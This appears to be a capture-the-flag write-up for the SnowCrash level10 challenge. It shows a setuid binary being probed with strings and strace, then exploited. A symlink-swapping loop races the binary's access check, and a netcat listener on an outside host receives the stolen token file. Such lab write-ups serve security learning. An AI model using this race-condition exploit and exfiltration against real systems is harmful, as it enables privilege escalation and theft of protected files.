level10@SnowCrash:~$ ls -laRh
-rwsr-sr-x+ 1 flag10  level10  11K Mar  5  2016 level10
-rw-------  1 flag10  flag10    26 Mar  5  2016 token


level10@SnowCrash:~$ ./level10 hey hello
You don't have access to hey

level10@SnowCrash:~$ echo "Hello World" > /tmp/test.txt
level10@SnowCrash:~$ ./level10 /tmp/test.txt hey
Connecting to hey:6969 .. Unable to connect to host hey

strings ./level10 hey helo
socket
connect
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
[...]
strings: 'hey': No such file
strings: 'helo': No such file

level10@SnowCrash:~$ strace ./level10 hey helo
access("hey", R_OK)                     = -1 ENOENT (No such file or directory)
write(1, "You don't have access to hey\n", 29You don't have access to hey
) = 29

1. launch a server to listen to port 6969 (with nc ?)
2. create a file with permission for the access check with symlink on an other full perm file, and change the symlink before the opens so it opens the token instead using flag10's permissions 
3. get content from nc listener


1. On a terminal outside the VM
nc -klvnp 6969 -s 10.24.109.3

(get [ip] from `ip a` enp0[...])
we have a server listening on port 6969, and that doesn't close at first received content, thanks to the -k option


2. on the terminal inside the VM
$ $(while true; do ln -sf /tmp/permfile /tmp/symfile; ln -sf $(pwd)/token /tmp/symfile; done)&

This will swap the symbolic link between /tmp/coucou which has all rights and the token file
($ to make it a background job so we still have our terminal available)


while true; do ./level10 /tmp/symfile 10.24.109.3; sleep 0.3; done
and this one spams every 0.3 second the execution of level10 hoping to make it at the right time where the access check is done on /tmp/coucou and the open on /tmp/token
